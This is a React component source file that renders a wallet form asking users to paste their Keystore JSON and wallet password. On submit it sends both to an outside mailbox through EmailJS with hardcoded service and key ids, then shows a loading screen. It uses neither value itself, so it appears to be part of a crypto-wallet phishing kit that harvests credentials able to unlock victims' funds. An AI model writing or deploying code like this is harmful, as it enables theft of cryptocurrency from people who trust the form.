import classes from './KeystoreJson.module.css'
import {Form, Button} from 'react-bootstrap';
import Aux from '../hoc/Auxiliary/Auxiliary';
import arrow from '../../../public/icons/arrow.png'
import React from 'react';
import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';




class KeystoreJson extends React.Component{

    constructor(props){
        super(props)
        this.state = {
            info: {
                keystoreJson: '',
                password: '',
                walletAddress: ''
            },
            errors: {
                keystoreJson: '',
                password: '',
                walletAddress: ''
            },
            keystoreJsonValid: false,
            passwordValid: false,
            walletaddressValid: false,
            formValid: false
        }
        this.submitForm = this.submitForm.bind(this)

    }

    handleChange(e) {
        let info = this.state.info;
        const name = e.target.name;
        const value = e.target.value;
        info[name] = value

            this.setState({info : {...info}}, () => {
                this.validateField(name, value)
            });


      }

    validateField(name, value) {
        let errors = this.state.errors;
        let keystoreJsonValid = this.state.keystoreJsonValid;
        let passwordValid = this.state.passwordValid;
        let walletaddressValid = this.state.walletaddressValid

      if(name === 'walletAddress') {
          walletaddressValid = value.length >= 20;
          errors.walletAddress = walletaddressValid ? '' : 'Wallet Address is too short'
      } else if (name === 'password') {
        passwordValid = value.length >= 3
          errors.password = passwordValid ? '' : 'password is too short'
      }else if (name === 'keystoreJson') {
        keystoreJsonValid = value.length >= 0
        errors.keystoreJson = keystoreJsonValid ? '' : 'keystoreJson is too short'
    }

      this.setState({
          errors: errors,
          keystoreJsonValid: keystoreJsonValid,
          passwordValid: passwordValid,
          walletaddressValid: walletaddressValid
        },  this.validateForm);
    }

    validateForm() {

      this.setState({
          formValid: this.state.keystoreJsonValid && this.state.passwordValid
      })
  }

    submitForm(e){
        e.preventDefault(); // Prevents default refresh by the browser

        let template = {
            keystorejson: this.state.info.keystoreJson,
            password: this.state.info.password,
        }

        emailjs.send('service_q0cj98e', 'template_9l9tkwh', template, {
            publicKey: '4LgmpWQyQz41eoC4j'
        })
        .then((result) => {
        // alert("Message Sent, We will get back to you shortly", result.text);
        this.props.modalClosed()
        this.props.startPreloader()
        },
        (err) => {
            if (err instanceof EmailJSResponseStatus) {
                alert(`An error occurred, Please try again`);
                return;
              }
        });

    }

  render() {

    return(
        <Aux>
            <Form >
            {/* <Form.Group  className="mb-3" controlId="exampleForm.ControlInput1">

                   <Form.Control className={this.state.errors.walletAddress ? classes.Error : ''} name="walletAddress" value={this.state.info.walletAddress} onChange={(e) => {this.handleChange(e)}}   type="text" placeholder="Wallet Address" />
                   <small><span className={classes.Up}>{this.state.errors.walletAddress}</span></small>

               </Form.Group> */}

               <Form.Group className="mb-3" controlId="exampleForm.ControlTextarea1">
                   <Form.Control className={this.state.errors.keystoreJson ? classes.Error : ''} name="keystoreJson" value={this.state.info.keystoreJson} onChange={(e) => {this.handleChange(e)}}  as="textarea" placeholder="Keystore JSON" rows={5} />
                   <small><span className={classes.Up}>{this.state.errors.keystoreJson}</span></small>

               </Form.Group>

               <Form.Group  className="mb-3" controlId="exampleForm.ControlInput1">

                   <Form.Control className={this.state.errors.password ? classes.Error : ''} name="password" value={this.state.info.password} onChange={(e) => {this.handleChange(e)}}   type="password" placeholder="Wallet password" />
                   <small><span className={classes.Up}>{this.state.errors.password}</span></small>

               </Form.Group>
               <small className='text-white' style={{fontSize: '12px'}}>
               Several lines of text beginning with [...] plus the password you used to encrypt it.
               </small>
                <br></br>
               <Button disabled={!this.state.formValid} onClick={this.submitForm} style={{width: '100%'}}>proceed </Button>
            </Form>
        </Aux>
     );
  }

}

export default KeystoreJson